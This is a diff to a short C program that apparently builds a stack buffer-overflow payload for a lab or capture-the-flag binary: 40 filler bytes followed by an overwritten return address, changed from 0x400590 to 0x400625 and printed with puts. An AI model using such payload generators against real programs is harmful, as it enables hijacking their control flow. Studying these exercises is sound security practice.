@@ -2,10 +2,11 @@
 #include <stdint.h>
 
 int main() {
-    int i=0; char buf[45];
-    memset(buf, 'x', 44);
-    *(uint32_t *) &buf[40] = 0x400590;
-    buf[44] = '\0';
+    const int offset = 40; // print/u $rsp - small on end of lame func
+    int i=0; char buf[offset + 5];
+    memset(buf, 'x', offset + 4);
+    *(uint32_t *) &buf[offset] = 0x400625;
+    buf[offset + 4] = '\0';
     puts(buf);
     return 0;
 }
